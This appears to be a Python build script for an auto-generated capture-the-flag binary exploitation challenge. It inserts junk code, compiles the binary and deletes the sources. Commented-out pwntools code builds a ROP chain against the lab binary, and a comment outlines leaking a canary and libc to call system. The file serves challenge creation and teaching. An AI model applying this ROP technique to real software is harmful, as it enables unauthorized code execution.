import subprocess
import os
import sys
from colorama import Fore, Back, Style
                    # chals_out/chal_name/team_name so 3
sys.path.insert(1, os.path.join(sys.path[0], '../../..'))
from libchals import *

from pwn import *

context.log_level = 'error'
FNULL = open(os.devnull, 'w')


# junk code generation
write_junk_calls("main.c", 41, 3)
write_junk_calls("main.c", 28, 3)
write_junk_calls("main.c", 24)
write_junk_body("main.c", 10)

subprocess.call("make", stdout=FNULL, stderr=FNULL)

# in a perfect world we would actually generate a correction for each challenge
# but I'm too lazy to auto-calculate a string format finder automatically.
# the idea is simply: print puts address, print canary, build ropchain to call
# system with printed canary and libc base thanks to puts. No need to even
# defeat PIE!
"""
# we generate the rop
elf = ELF("reverse_rop")
rop = ROP(elf)
FLAG1 = elf.symbols['flag1']
FLAG2 = elf.symbols['flag2']
FLAG3 = elf.symbols['flag3']
FLAG6 = elf.symbols['flag6']
XOR = elf.symbols['xor']
XOR2 = elf.symbols['xor2']
XOR3 = elf.symbols['xor3']
POP_ONCE = (rop.find_gadget(['pop ebx', 'ret']))[0] 

padding = b'A' * 28

exploit = padding + p32(FLAG1) + p32(FLAG2) + p32(POP_ONCE) + p32(0xAABBCCD2)
exploit += p32(XOR) + p32(FLAG3) + p32(POP_ONCE) + p32(0xAABBCCD1) + p32(FLAG3) 
exploit += p32(POP_ONCE) + p32(0xAABBCCD2) + p32(XOR2) + p32(FLAG3) +p32(POP_ONCE) 
exploit += p32(0xAABBCCD5) + p32(XOR3) + p32(FLAG6) + p32(POP_ONCE) + p32(0xBBCCDDE9) + p32(0xBBCCDDE3)

# rop is saved as input
f = open("input", "wb")
f.write(exploit)
f.close()

# strip it after the ropchain building so they don't have the symbols but we do
subprocess.call(["strip", "reverse_rop"], stdout=FNULL, stderr=FNULL)
"""


os.remove("main.c")
os.remove("Makefile")
os.remove("setup.py")

# see above
"""
# TESTING BINARY
try:
    output = subprocess.check_output("gdb -ex 'run < input' -ex 'print $eip' -ex quit ./reverse_rop | tail -n 1", shell=True, stderr=subprocess.STDOUT)
except Exception as e:
    output = str(e.output)
if not b"0xbbccdde3" in output:
    fail_test()
"""
